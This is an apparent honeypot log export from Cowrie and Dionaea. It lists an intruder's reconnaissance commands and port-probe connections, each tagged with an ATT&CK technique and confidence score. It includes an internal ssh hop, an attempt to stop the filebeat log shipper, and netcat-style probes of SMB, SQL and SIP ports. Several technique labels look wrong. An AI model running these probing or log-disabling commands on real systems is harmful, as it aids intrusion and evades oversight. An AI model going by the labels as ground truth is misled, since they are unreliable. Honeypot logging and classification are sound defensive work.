+cowrie,cowrie.command.input,2025-12-26T13:05:04.584839Z,100.80.22.20,,,,sudo -l,cowrie.json,660,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-26T13:05:11.247951Z,100.80.22.20,,,,uname -l,cowrie.json,661,BENIGN,0.849663,1,
+cowrie,cowrie.command.input,2025-12-26T13:05:13.492747Z,100.80.22.20,,,,uname,cowrie.json,662,BENIGN,0.52744,1,
+cowrie,cowrie.command.input,2025-12-26T13:05:24.152123Z,100.80.22.20,,,,whoami,cowrie.json,663,BENIGN,0.955141,1,
+cowrie,cowrie.command.input,2025-12-26T13:05:45.965081Z,100.80.22.20,,,,ssh cowrie@100.113.245.10 -p 2200,cowrie.json,664,T1048_Exfiltration_Over_Alternative_Protocol,0.31532,1,
+cowrie,cowrie.command.input,2025-12-26T13:06:05.583175Z,100.80.22.20,,,,ls,cowrie.json,665,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-26T13:06:54.945722Z,100.80.22.20,,,,sudo -l,cowrie.json,666,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-26T13:07:00.435202Z,100.80.22.20,,,,clear,cowrie.json,667,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-26T13:07:01.377547Z,100.80.22.20,,,,ip,cowrie.json,668,BENIGN,0.884632,1,
+cowrie,cowrie.command.input,2025-12-26T13:07:03.134477Z,100.80.22.20,,,,ip a,cowrie.json,670,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-26T13:07:29.726311Z,100.80.22.20,,,,exit,cowrie.json,672,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-26T13:10:05.212954Z,100.80.22.20,,,,sudo -l,cowrie.json,684,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-26T13:10:45.632668Z,100.80.22.20,,,,exit,cowrie.json,685,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-26T13:16:44.272010Z,100.80.22.20,,,,ifeih,cowrie.json,696,T1033_System_Owner_Discovery,0.252343,1,
+cowrie,cowrie.command.input,2025-12-26T13:16:51.569853Z,100.80.22.20,,,,sudo apt install ssh,cowrie.json,698,T1078_Valid_Accounts,0.363673,1,
+cowrie,cowrie.command.input,2025-12-26T13:17:28.924477Z,100.80.22.20,,,,exit,cowrie.json,699,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-27T14:57:02.863963Z,100.80.22.20,,,,ls /home,cowrie.json,717,BENIGN,0.984572,1,
+cowrie,cowrie.command.input,2025-12-27T14:57:07.710336Z,100.80.22.20,,,,uname,cowrie.json,718,BENIGN,0.52744,1,
+cowrie,cowrie.command.input,2025-12-27T14:57:15.186823Z,100.80.22.20,,,,sudo -l,cowrie.json,719,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-27T14:58:31.598586Z,100.80.22.20,,,,clear,cowrie.json,720,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-27T14:58:34.171279Z,100.80.22.20,,,,ip a,cowrie.json,721,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-27T14:58:38.629299Z,100.80.22.20,,,,ip route,cowrie.json,723,T1016_System_Network_Config_Discovery,0.784752,1,
+cowrie,cowrie.command.input,2025-12-14T09:20:36.393165Z,100.80.22.20,,,,ip a,cowrie.json,734,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-14T09:20:39.602324Z,100.80.22.20,,,,hi,cowrie.json,736,BENIGN,0.930545,1,
+cowrie,cowrie.command.input,2025-12-14T09:20:44.556694Z,100.80.22.20,,,,ls,cowrie.json,738,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-14T09:21:21.198104Z,100.80.22.20,,,,sudo apt prune cowrie,cowrie.json,739,BENIGN,0.96339,1,
+cowrie,cowrie.command.input,2025-12-14T09:21:52.891076Z,100.80.22.20,,,,attack cowrie,cowrie.json,740,BENIGN,0.986602,1,
+cowrie,cowrie.command.input,2025-12-14T09:21:55.427354Z,100.80.22.20,,,,cowrie,cowrie.json,742,BENIGN,0.976387,1,
+cowrie,cowrie.command.input,2025-12-14T09:21:57.818488Z,100.80.22.20,,,,kibana,cowrie.json,744,BENIGN,0.838441,1,
+cowrie,cowrie.command.input,2025-12-14T09:22:00.889732Z,100.80.22.20,,,,ip a,cowrie.json,746,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-14T09:22:14.221330Z,100.80.22.20,,,,add user cowrie,cowrie.json,748,BENIGN,0.926251,1,
+cowrie,cowrie.command.input,2025-12-14T09:22:25.111494Z,100.80.22.20,,,,add group,cowrie.json,750,BENIGN,0.232452,1,
+cowrie,cowrie.command.input,2025-12-14T09:22:31.067450Z,100.80.22.20,,,,user add cowrie,cowrie.json,752,BENIGN,0.948672,1,
+cowrie,cowrie.command.input,2025-12-14T09:22:38.216863Z,100.80.22.20,,,,no log data,cowrie.json,754,T1048_Exfiltration_Over_Alternative_Protocol,0.340261,1,
+cowrie,cowrie.command.input,2025-12-14T09:22:51.881425Z,100.80.22.20,,,,sudo stop filebeat,cowrie.json,756,BENIGN,0.947038,1,
+cowrie,cowrie.command.input,2025-12-14T09:22:58.368792Z,100.80.22.20,,,,sudo,cowrie.json,757,BENIGN,0.415953,1,
+cowrie,cowrie.command.input,2025-12-14T09:23:01.257806Z,100.80.22.20,,,,clear,cowrie.json,758,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-14T09:23:10.133832Z,100.80.22.20,,,,cd /usr,cowrie.json,759,BENIGN,0.990721,1,
+cowrie,cowrie.command.input,2025-12-14T09:23:11.260784Z,100.80.22.20,,,,ls,cowrie.json,760,BENIGN,0.990103,1,
+dionaea,connection,2025-12-24T10:34:05.797425,172.17.0.1,172.17.0.2,36356,80,nc 172.17.0.1 80,attack_logs.json,1,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-24T10:36:18.366162,172.17.0.1,172.17.0.2,55870,21,nc 172.17.0.1 21,attack_logs.json,2,BENIGN,0.988627,1,ftpd
+dionaea,connection,2025-12-24T10:37:23.938849,172.17.0.1,172.17.0.2,57532,445,nc 172.17.0.1 445,attack_logs.json,3,BENIGN,0.99006,1,smbd
+dionaea,connection,2025-12-24T10:37:40.235154,172.17.0.1,172.17.0.2,41188,21,nc 172.17.0.1 21,attack_logs.json,5,BENIGN,0.988627,1,ftpd
+dionaea,connection,2025-12-24T10:38:57.987499,172.17.0.1,172.17.0.2,41030,80,nc 172.17.0.1 80,attack_logs.json,6,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-24T10:39:34.970920,172.17.0.1,172.17.0.2,39696,80,nc 172.17.0.1 80,attack_logs.json,7,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-24T10:41:05.096786,172.17.0.1,172.17.0.2,51667,80,nc 172.17.0.1 80,attack_logs.json,8,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T09:03:24.740025,172.17.0.1,172.17.0.2,52496,80,nc 172.17.0.1 80,attack_logs.json,9,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T09:32:53.524586,172.17.0.1,172.17.0.2,39862,80,nc 172.17.0.1 80,attack_logs.json,10,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T09:42:57.385300,172.17.0.1,172.17.0.2,33702,80,nc 172.17.0.1 80,attack_logs.json,11,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T09:43:07.723229,172.17.0.1,172.17.0.2,34526,80,nc 172.17.0.1 80,attack_logs.json,12,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T09:43:57.527939,172.17.0.1,172.17.0.2,43318,80,nc 172.17.0.1 80,attack_logs.json,13,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T17:10:32.249458,172.17.0.1,172.17.0.2,56834,80,nc 172.17.0.1 80,attack_logs.json,14,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T17:22:40.799507,172.17.0.1,172.17.0.2,45168,80,nc 172.17.0.1 80,attack_logs.json,15,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-25T17:25:25.163027,172.17.0.1,172.17.0.2,48358,80,nc 172.17.0.1 80,attack_logs.json,16,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-26T05:37:04.374858,172.17.0.1,172.17.0.2,54532,80,nc 172.17.0.1 80,attack_logs.json,17,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-26T05:40:39.672542,100.80.22.20,172.17.0.2,38010,80,nc 100.80.22.20 80,attack_logs.json,18,T1113_Screen_Capture,0.187911,1,httpd
+dionaea,connection,2025-12-26T05:42:59.140806,172.17.0.1,172.17.0.2,52796,80,nc 172.17.0.1 80,attack_logs.json,19,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-26T05:43:54.323776,100.65.39.23,172.17.0.2,57106,80,nc 100.65.39.23 80,attack_logs.json,20,BENIGN,0.802364,1,httpd
+dionaea,connection,2025-12-26T05:57:14.667677,100.80.22.20,172.17.0.2,53360,80,nc 100.80.22.20 80,attack_logs.json,21,T1113_Screen_Capture,0.187911,1,httpd
+dionaea,connection,2025-12-26T08:03:54.375227,100.113.245.10,172.17.0.2,48498,80,nc 100.113.245.10 80,attack_logs.json,22,T1071_Application_Layer_Protocol,0.399094,1,httpd
+dionaea,connection,2025-12-26T08:10:58.854905,100.80.22.20,172.17.0.2,59072,80,nc 100.80.22.20 80,attack_logs.json,23,T1113_Screen_Capture,0.187911,1,httpd
+dionaea,connection,2025-12-26T08:11:07.755583,100.80.22.20,172.17.0.2,37330,21,nc 100.80.22.20 21,attack_logs.json,24,BENIGN,0.969012,1,ftpd
+dionaea,connection,2025-12-26T08:14:01.160125,100.80.22.20,172.17.0.2,43380,21,nc 100.80.22.20 21,attack_logs.json,25,BENIGN,0.969012,1,ftpd
+dionaea,connection,2025-12-26T08:14:26.906251,100.80.22.20,172.17.0.2,44884,80,nc 100.80.22.20 80,attack_logs.json,26,T1113_Screen_Capture,0.187911,1,httpd
+dionaea,connection,2025-12-26T08:15:48.703235,100.80.22.20,172.17.0.2,43592,80,nc 100.80.22.20 80,attack_logs.json,27,T1113_Screen_Capture,0.187911,1,httpd
+dionaea,connection,2025-12-26T08:16:18.340558,100.80.22.20,172.17.0.2,34818,80,nc 100.80.22.20 80,attack_logs.json,28,T1113_Screen_Capture,0.187911,1,httpd
+dionaea,connection,2025-12-27T09:21:28.158011,172.17.0.1,172.17.0.2,40042,80,nc 172.17.0.1 80,attack_logs.json,29,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-27T09:54:17.532548,172.17.0.1,172.17.0.2,50454,80,nc 172.17.0.1 80,attack_logs.json,30,BENIGN,0.944372,1,httpd
+dionaea,connection,2025-12-27T09:56:38.887464,172.17.0.1,172.17.0.2,56354,80,nc 172.17.0.1 80,attack_logs.json,31,BENIGN,0.944372,1,httpd
+dionaea,connection,2026-02-21T09:48:18.365857,100.65.39.23,172.17.0.2,51946,80,nc 100.65.39.23 80,attack_logs.json,32,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:18.533492,100.65.39.23,172.17.0.2,51954,80,nc 100.65.39.23 80,attack_logs.json,33,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:18.590607,100.65.39.23,172.17.0.2,51951,3306,nc 100.65.39.23 3306,attack_logs.json,34,BENIGN,0.986372,1,mysqld
+dionaea,connection,2026-02-21T09:48:18.619592,100.65.39.23,172.17.0.2,51965,445,nc 100.65.39.23 445,attack_logs.json,35,BENIGN,0.988592,1,smbd
+dionaea,connection,2026-02-21T09:48:18.656388,100.65.39.23,172.17.0.2,51958,135,nc 100.65.39.23 135,attack_logs.json,36,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:48:19.770123,100.65.39.23,172.17.0.2,51990,21,nc 100.65.39.23 21,attack_logs.json,37,BENIGN,0.986564,1,ftpd
+dionaea,connection,2026-02-21T09:48:19.954284,100.65.39.23,172.17.0.2,52052,1433,nc 100.65.39.23 1433,attack_logs.json,38,BENIGN,0.989143,1,mssqld
+dionaea,connection,2026-02-21T09:48:20.967819,100.65.39.23,172.17.0.2,52339,5060,nc 100.65.39.23 5060,attack_logs.json,39,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:48:21.341812,100.65.39.23,172.17.0.2,52379,5060,nc 100.65.39.23 5060,attack_logs.json,40,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:48:21.772484,100.65.39.23,172.17.0.2,52511,80,nc 100.65.39.23 80,attack_logs.json,41,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:23.004932,100.65.39.23,172.17.0.2,52559,80,nc 100.65.39.23 80,attack_logs.json,42,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:23.906162,100.65.39.23,172.17.0.2,52572,80,nc 100.65.39.23 80,attack_logs.json,43,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:25.268950,100.65.39.23,172.17.0.2,52591,80,nc 100.65.39.23 80,attack_logs.json,44,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:26.573443,100.65.39.23,172.17.0.2,53366,80,nc 100.65.39.23 80,attack_logs.json,45,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:27.309854,100.65.39.23,172.17.0.2,42,39599,nc 100.65.39.23 39599,attack_logs.json,46,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:48:27.334164,100.65.39.23,172.17.0.2,53686,42,nc 100.65.39.23 42,attack_logs.json,47,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:27.445466,100.65.39.23,172.17.0.2,42,39433,nc 100.65.39.23 39433,attack_logs.json,48,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:48:27.473443,100.65.39.23,172.17.0.2,53765,42,nc 100.65.39.23 42,attack_logs.json,49,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:28.827955,100.65.39.23,172.17.0.2,53984,80,nc 100.65.39.23 80,attack_logs.json,50,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:30.166458,100.65.39.23,172.17.0.2,54057,80,nc 100.65.39.23 80,attack_logs.json,51,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:30.725541,100.65.39.23,172.17.0.2,42,43501,nc 100.65.39.23 43501,attack_logs.json,52,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:48:30.756749,100.65.39.23,172.17.0.2,54184,42,nc 100.65.39.23 42,attack_logs.json,53,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:32.018561,100.65.39.23,172.17.0.2,54383,80,nc 100.65.39.23 80,attack_logs.json,54,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:33.298879,100.65.39.23,172.17.0.2,54663,80,nc 100.65.39.23 80,attack_logs.json,55,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:34.599531,100.65.39.23,172.17.0.2,55020,80,nc 100.65.39.23 80,attack_logs.json,56,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:35.883912,100.65.39.23,172.17.0.2,55492,80,nc 100.65.39.23 80,attack_logs.json,57,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:35.939205,100.65.39.23,172.17.0.2,55511,5060,nc 100.65.39.23 5060,attack_logs.json,58,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:48:37.218910,100.65.39.23,172.17.0.2,55862,80,nc 100.65.39.23 80,attack_logs.json,59,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:37.973365,100.65.39.23,172.17.0.2,55949,3306,nc 100.65.39.23 3306,attack_logs.json,60,BENIGN,0.986372,1,mysqld
+dionaea,connection,2026-02-21T09:48:37.896821,100.65.39.23,172.17.0.2,55939,21,nc 100.65.39.23 21,attack_logs.json,61,BENIGN,0.986564,1,ftpd
+dionaea,connection,2026-02-21T09:48:38.054428,100.65.39.23,172.17.0.2,42,38787,nc 100.65.39.23 38787,attack_logs.json,62,BENIGN,0.986817,1,mirrorc
+dionaea,connection,2026-02-21T09:48:38.080957,100.65.39.23,172.17.0.2,55941,42,nc 100.65.39.23 42,attack_logs.json,63,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:38.034622,100.65.39.23,172.17.0.2,55942,80,nc 100.65.39.23 80,attack_logs.json,64,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:48:37.954385,100.65.39.23,172.17.0.2,55950,5060,nc 100.65.39.23 5060,attack_logs.json,65,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:48:38.004791,100.65.39.23,172.17.0.2,55945,445,nc 100.65.39.23 445,attack_logs.json,66,BENIGN,0.988592,1,smbd
+dionaea,connection,2026-02-21T09:48:42.946922,100.65.39.23,172.17.0.2,42,46403,nc 100.65.39.23 46403,attack_logs.json,67,BENIGN,0.986909,1,mirrorc
+dionaea,connection,2026-02-21T09:48:43.036456,100.65.39.23,172.17.0.2,55952,42,nc 100.65.39.23 42,attack_logs.json,68,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:38.020602,100.65.39.23,172.17.0.2,55943,135,nc 100.65.39.23 135,attack_logs.json,69,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:48:37.988574,100.65.39.23,172.17.0.2,55946,1433,nc 100.65.39.23 1433,attack_logs.json,70,BENIGN,0.989143,1,mssqld
+dionaea,connection,2026-02-21T09:48:48.935704,100.65.39.23,172.17.0.2,55958,1433,nc 100.65.39.23 1433,attack_logs.json,71,BENIGN,0.989143,1,mssqld
+dionaea,connection,2026-02-21T09:48:44.060384,100.65.39.23,172.17.0.2,55953,443,nc 100.65.39.23 443,attack_logs.json,72,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:48:44.094915,100.65.39.23,172.17.0.2,55954,5061,nc 100.65.39.23 5061,attack_logs.json,73,BENIGN,0.98061,1,SipSession
+dionaea,connection,2026-02-21T09:48:44.000733,100.65.39.23,172.17.0.2,55955,5060,nc 100.65.39.23 5060,attack_logs.json,74,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:48:48.008034,100.65.39.23,172.17.0.2,42,38167,nc 100.65.39.23 38167,attack_logs.json,75,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:48:48.026551,100.65.39.23,172.17.0.2,55956,42,nc 100.65.39.23 42,attack_logs.json,76,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:48.920130,100.65.39.23,172.17.0.2,55957,135,nc 100.65.39.23 135,attack_logs.json,77,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:48:51.502900,100.65.39.23,172.17.0.2,55960,5060,nc 100.65.39.23 5060,attack_logs.json,78,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:48:50.193283,100.65.39.23,172.17.0.2,55959,5061,nc 100.65.39.23 5061,attack_logs.json,79,BENIGN,0.98061,1,SipSession
+dionaea,connection,2026-02-21T09:48:53.021570,100.65.39.23,172.17.0.2,42,46577,nc 100.65.39.23 46577,attack_logs.json,80,BENIGN,0.985554,1,mirrorc
+dionaea,connection,2026-02-21T09:48:53.157881,100.65.39.23,172.17.0.2,55965,42,nc 100.65.39.23 42,attack_logs.json,81,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:53.931102,100.65.39.23,172.17.0.2,55967,135,nc 100.65.39.23 135,attack_logs.json,82,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:48:57.705329,100.65.39.23,172.17.0.2,55968,5061,nc 100.65.39.23 5061,attack_logs.json,83,BENIGN,0.98061,1,SipSession
+dionaea,connection,2026-02-21T09:48:58.031368,100.65.39.23,172.17.0.2,42,44419,nc 100.65.39.23 44419,attack_logs.json,84,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:48:58.047065,100.65.39.23,172.17.0.2,55969,42,nc 100.65.39.23 42,attack_logs.json,85,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:48:58.938366,100.65.39.23,172.17.0.2,55970,135,nc 100.65.39.23 135,attack_logs.json,86,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:03.037430,100.65.39.23,172.17.0.2,42,40021,nc 100.65.39.23 40021,attack_logs.json,87,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:03.103579,100.65.39.23,172.17.0.2,55972,42,nc 100.65.39.23 42,attack_logs.json,88,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:03.949369,100.65.39.23,172.17.0.2,55973,135,nc 100.65.39.23 135,attack_logs.json,89,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:08.116354,100.65.39.23,172.17.0.2,42,33603,nc 100.65.39.23 33603,attack_logs.json,90,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:08.130929,100.65.39.23,172.17.0.2,55974,42,nc 100.65.39.23 42,attack_logs.json,91,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:08.959081,100.65.39.23,172.17.0.2,55975,135,nc 100.65.39.23 135,attack_logs.json,92,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:13.055353,100.65.39.23,172.17.0.2,42,33747,nc 100.65.39.23 33747,attack_logs.json,93,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:13.139337,100.65.39.23,172.17.0.2,55977,42,nc 100.65.39.23 42,attack_logs.json,94,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:13.988179,100.65.39.23,172.17.0.2,55978,135,nc 100.65.39.23 135,attack_logs.json,95,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:18.065543,100.65.39.23,172.17.0.2,42,35507,nc 100.65.39.23 35507,attack_logs.json,96,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:18.105045,100.65.39.23,172.17.0.2,55979,42,nc 100.65.39.23 42,attack_logs.json,97,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:19.003628,100.65.39.23,172.17.0.2,55980,135,nc 100.65.39.23 135,attack_logs.json,98,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:23.073227,100.65.39.23,172.17.0.2,42,44725,nc 100.65.39.23 44725,attack_logs.json,99,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:23.145922,100.65.39.23,172.17.0.2,55981,42,nc 100.65.39.23 42,attack_logs.json,100,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:24.014927,100.65.39.23,172.17.0.2,55982,135,nc 100.65.39.23 135,attack_logs.json,101,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:28.084965,100.65.39.23,172.17.0.2,42,39515,nc 100.65.39.23 39515,attack_logs.json,102,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:28.101806,100.65.39.23,172.17.0.2,55983,42,nc 100.65.39.23 42,attack_logs.json,103,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:31.531087,100.65.39.23,172.17.0.2,55984,135,nc 100.65.39.23 135,attack_logs.json,104,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:33.096257,100.65.39.23,172.17.0.2,42,46851,nc 100.65.39.23 46851,attack_logs.json,105,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:33.112064,100.65.39.23,172.17.0.2,55985,42,nc 100.65.39.23 42,attack_logs.json,106,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:36.528218,100.65.39.23,172.17.0.2,55986,135,nc 100.65.39.23 135,attack_logs.json,107,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:38.102351,100.65.39.23,172.17.0.2,42,40399,nc 100.65.39.23 40399,attack_logs.json,108,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:38.199182,100.65.39.23,172.17.0.2,55987,42,nc 100.65.39.23 42,attack_logs.json,109,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:41.526651,100.65.39.23,172.17.0.2,55995,135,nc 100.65.39.23 135,attack_logs.json,110,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:43.107495,100.65.39.23,172.17.0.2,42,43909,nc 100.65.39.23 43909,attack_logs.json,111,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:43.196552,100.65.39.23,172.17.0.2,56000,42,nc 100.65.39.23 42,attack_logs.json,112,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:46.539350,100.65.39.23,172.17.0.2,56005,135,nc 100.65.39.23 135,attack_logs.json,113,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:51.544525,100.65.39.23,172.17.0.2,56007,135,nc 100.65.39.23 135,attack_logs.json,114,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:48.111253,100.65.39.23,172.17.0.2,42,34641,nc 100.65.39.23 34641,attack_logs.json,115,BENIGN,0.986781,1,mirrorc
+dionaea,connection,2026-02-21T09:49:48.128956,100.65.39.23,172.17.0.2,56006,42,nc 100.65.39.23 42,attack_logs.json,116,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:49:51.627165,100.65.39.23,172.17.0.2,56008,135,nc 100.65.39.23 135,attack_logs.json,117,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:56.630590,100.65.39.23,172.17.0.2,56011,135,nc 100.65.39.23 135,attack_logs.json,118,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:49:53.110208,100.65.39.23,172.17.0.2,42,37451,nc 100.65.39.23 37451,attack_logs.json,119,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:49:53.128205,100.65.39.23,172.17.0.2,56009,42,nc 100.65.39.23 42,attack_logs.json,120,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:52:12.895151,100.65.39.23,172.17.0.2,61521,21,nc 100.65.39.23 21,attack_logs.json,121,BENIGN,0.986564,1,ftpd
+dionaea,connection,2026-02-21T09:52:12.810814,100.65.39.23,172.17.0.2,61531,80,nc 100.65.39.23 80,attack_logs.json,122,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:12.849406,100.65.39.23,172.17.0.2,61525,3306,nc 100.65.39.23 3306,attack_logs.json,123,BENIGN,0.986372,1,mysqld
+dionaea,connection,2026-02-21T09:52:12.966582,100.65.39.23,172.17.0.2,61515,445,nc 100.65.39.23 445,attack_logs.json,124,BENIGN,0.988592,1,smbd
+dionaea,connection,2026-02-21T09:52:12.935038,100.65.39.23,172.17.0.2,61517,135,nc 100.65.39.23 135,attack_logs.json,125,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:52:13.240589,100.65.39.23,172.17.0.2,61510,80,nc 100.65.39.23 80,attack_logs.json,126,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:15.529944,100.65.39.23,172.17.0.2,61559,80,nc 100.65.39.23 80,attack_logs.json,127,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:17.121842,100.65.39.23,172.17.0.2,61630,80,nc 100.65.39.23 80,attack_logs.json,128,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:18.505366,100.65.39.23,172.17.0.2,61769,80,nc 100.65.39.23 80,attack_logs.json,129,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:19.800427,100.65.39.23,172.17.0.2,61957,80,nc 100.65.39.23 80,attack_logs.json,130,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:21.669712,100.65.39.23,172.17.0.2,42,33041,nc 100.65.39.23 33041,attack_logs.json,131,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:52:21.762439,100.65.39.23,172.17.0.2,62236,42,nc 100.65.39.23 42,attack_logs.json,132,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:52:23.096736,100.65.39.23,172.17.0.2,62515,80,nc 100.65.39.23 80,attack_logs.json,133,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:24.510213,100.65.39.23,172.17.0.2,62785,80,nc 100.65.39.23 80,attack_logs.json,134,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:25.619612,100.65.39.23,172.17.0.2,62939,5060,nc 100.65.39.23 5060,attack_logs.json,135,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:52:26.133219,100.65.39.23,172.17.0.2,63021,5060,nc 100.65.39.23 5060,attack_logs.json,136,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:52:26.550288,100.65.39.23,172.17.0.2,63034,80,nc 100.65.39.23 80,attack_logs.json,137,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:26.604554,100.65.39.23,172.17.0.2,63110,1433,nc 100.65.39.23 1433,attack_logs.json,138,BENIGN,0.989143,1,mssqld
+dionaea,connection,2026-02-21T09:52:27.373901,100.65.39.23,172.17.0.2,63118,80,nc 100.65.39.23 80,attack_logs.json,139,BENIGN,0.802364,1,httpd
